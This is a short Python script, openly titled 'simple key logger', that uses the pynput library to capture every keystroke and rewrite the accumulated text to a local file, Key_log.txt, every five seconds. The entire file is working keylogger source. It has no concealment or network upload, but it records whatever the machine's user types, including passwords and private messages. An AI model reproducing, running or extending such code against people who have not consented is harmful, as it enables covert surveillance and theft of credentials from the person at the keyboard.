import pynput
import threading
import pyfiglet

log = ""
text = pyfiglet.figlet_format("simple key logger")
print(text)


def key_pressed(key): # this func adds key strike to the log variable
    global log
    try:
        log = log + key.char
    except AttributeError:
        if key == key.space:
            key = " " + ""
            log = log + key


def report():
    global log # inital global log is an emtpy string

    with open("Key_log.txt", "w") as key_log:
        key_log.write(log)
    # after every 5 sec wirte to file
    try:
        timer = threading.Timer(5, report)
        timer.start()
    except KeyboardInterrupt:
        pass


try:
    keyboard = pynput.keyboard.Listener(on_press=key_pressed)
    with keyboard:
        report()
        keyboard.join()
except KeyboardInterrupt:
    pass

